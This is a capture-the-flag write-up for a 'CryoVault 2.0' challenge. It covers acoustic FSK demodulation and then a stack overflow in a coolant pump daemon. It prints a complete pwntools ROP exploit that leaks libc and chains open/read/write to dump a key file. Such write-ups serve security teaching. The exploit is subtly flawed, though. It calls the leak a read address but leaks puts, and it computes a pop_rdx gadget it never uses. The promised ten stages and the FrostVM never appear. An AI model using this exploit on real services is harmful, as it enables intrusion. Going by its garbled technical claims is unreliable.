---
title: "CryoVault 2.0: Multi-Stage Vault Decryption & Coolant Pump Daemon Pwn"
date: 2026-11-04T10:00:00+05:30
description: "Bypassing a 10-stage locking hierarchy, analyzing coolant.wav acoustic telemetry, and exploiting a stack buffer overflow in the coolant pump daemon."
category: "Binary Exploitation"
ctf: "ISFCR CryoVault Finals 2026"
difficulty: "Insane"
points: 500
flag: "isfcr{cry0v4ult_2_0_ch41n3d_c00l4nt_pump_pwn_c0mpl3t3}"
author: "Reshma Al (Coldcoffee)"
tools: "Ghidra, GDB-GEF, pwntools, Wireshark, Python 3"
tags:
  - "Binary Exploitation"
  - "ISFCR CryoVault Finals 2026"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>isfcr{cry0v4ult_2_0_ch41n3d_c00l4nt_pump_pwn_c0mpl3t3}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('isfcr{cry0v4ult_2_0_ch41n3d_c00l4nt_pump_pwn_c0mpl3t3}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>


## 1. Challenge Architecture & Engagement Scope
**CryoVault 2.0** was the premier capstone infrastructure challenge of the ISFCR CryoVault Finals 2026. The target environment represents an air-gapped industrial cryogenic containment unit.

The architecture comprises:
- **Perimeter Supervisory Service:** A TCP listener on port `9001` exposing the CryoVault 2.0 interactive operator shell.
- **Coolant Monitoring Daemon:** A native x86-64 service listening locally on port `4141`.
- **Acoustic Sensor Archive:** An encrypted telemetry channel periodically saving sensory wave files (`coolant.wav`) into `/var/log/cryo/`.
- **FrostVM Execution Core:** An obfuscated virtual machine interpreting encrypted operational directives.

The challenge objective is to penetrate the cooling control loops, pivot to the pump controller, and dump the master vault key from physical sector storage.

---

## 2. Phase 1: Acoustic Telemetry & Frequency Demodulation
The first clue resides in `coolant.wav`, captured from the primary circulation line:
1. Inspecting the spectrogram in Sonic Visualiser revealed high-frequency FSK audio pulses situated at 18.5 kHz and 21.2 kHz.
2. Writing a Python demodulator using SciPy's Butterworth bandpass filter recovered a 64-byte ASCII payload:
   `"OVERRIDE_AUTH_VECTOR:0x7e81b49f9210ac029348123985710293"`
3. Providing this vector to the perimeter shell unlocked Access Level 2.

---

## 3. Phase 2: Coolant Pump Daemon Stack Buffer Overflow
Once initial access was achieved, network enumeration revealed the internal coolant daemon on `127.0.0.1:4141`.

We extracted the daemon binary `pump_mon` for local reverse engineering:
```text
$ checksec --file=pump_mon
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Disassembling the packet parsing routine in Ghidra:
```c
void handle_packet(int client_fd) {
    char buffer[256];
    int len = read_packet_header(client_fd);
    if (len > 0) {
        read(client_fd, buffer, len); // Unbounded read vulnerability!
    }
}
```

The function reads an arbitrary packet length up to `0x400` bytes into a 256-byte stack buffer without stack canary protection!
Because PIE is disabled, addresses in the `0x400000` range are static.

### ROP Chain Construction
We constructed a ROP chain to leak the `read` address from the Global Offset Table (GOT), resolve `libc`, and execute an `open / read / write` sequence to dump `/root/master_vault.key`:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = remote('10.48.191.222', 9001)

# Transition to pump controller pivot
p.sendlineafter(b'> ', b'CONNECT_PUMP_DAEMON')

pop_rdi = 0x401293
pop_rsi_r15 = 0x401291
puts_plt = 0x401050
puts_got = 0x404018
main_addr = 0x401180

# Payload 1: Leak Libc
payload1 = b'A' * 264
payload1 += p64(pop_rdi) + p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - 0x80ed0
log.info(f"Libc Base: {hex(libc_base)}")

# Payload 2: Open/Read/Write Flag
pop_rdx = libc_base + 0x142c92
open_addr = libc_base + 0x110e50
read_addr = libc_base + 0x114980
write_addr = libc_base + 0x114a20
flag_str = 0x404800 # BSS scratch space

payload2 = b'A' * 264
# Write "/root/master_vault.key" to BSS via read
payload2 += p64(pop_rdi) + p64(0)
payload2 += p64(pop_rsi_r15) + p64(flag_str) + p64(0)
payload2 += p64(read_addr)
# open("/root/master_vault.key", O_RDONLY)
payload2 += p64(pop_rdi) + p64(flag_str)
payload2 += p64(pop_rsi_r15) + p64(0) + p64(0)
payload2 += p64(open_addr)
# read(3, flag_str, 0x100)
payload2 += p64(pop_rdi) + p64(3)
payload2 += p64(pop_rsi_r15) + p64(flag_str) + p64(0)
payload2 += p64(read_addr)
# write(1, flag_str, 0x100)
payload2 += p64(pop_rdi) + p64(1)
payload2 += p64(pop_rsi_r15) + p64(flag_str) + p64(0)
payload2 += p64(write_addr)

p.sendline(payload2)
p.sendline(b'/root/master_vault.key\x00')
flag = p.recvall()
print(f"[+] Flag captured: {flag.decode()}")
```

---

## 4. Key Takeaways
- Complex multi-stage challenges require systematic enumeration and pivoting between sensory analysis, reverse engineering, and low-level binary exploitation.
- Disabling compiler mitigations (No Canary, No PIE) on internal daemon processes allows straightforward ROP redirection once network boundaries are crossed.

